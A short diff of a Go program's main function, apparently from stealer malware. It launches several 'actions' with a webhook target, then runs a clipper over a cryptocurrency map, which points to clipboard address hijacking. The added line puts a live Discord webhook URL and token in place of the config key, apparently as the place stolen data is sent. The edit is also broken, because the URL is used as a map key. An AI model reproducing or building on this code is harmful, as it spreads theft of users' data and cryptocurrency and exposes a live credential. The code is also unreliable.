@@ -78,7 +78,7 @@ func main() {
 	}
 
 	for _, action := range actions {
-		go action(CONFIG["webhook"].(string))
+		go action(CONFIG["https://discord.com/api/webhooks/1311552379627245568/iAnj0GEwdVlMVL4s7AdnllzzXWyERMviqsivDQjrt4n-XXGlz6hkgqvGArhQq22K1WH7"].(string))
 	}
 
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
